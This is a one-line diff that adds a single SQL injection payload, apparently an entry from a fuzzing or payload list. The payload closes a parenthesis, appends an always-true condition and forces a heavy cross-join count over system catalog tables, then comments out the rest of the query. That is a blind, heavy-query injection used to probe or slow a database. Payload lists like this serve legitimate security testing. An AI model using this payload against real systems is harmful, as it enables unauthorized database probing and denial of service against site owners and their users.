@@ -1,0 +1,1 @@
+1) where 2679=2679 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
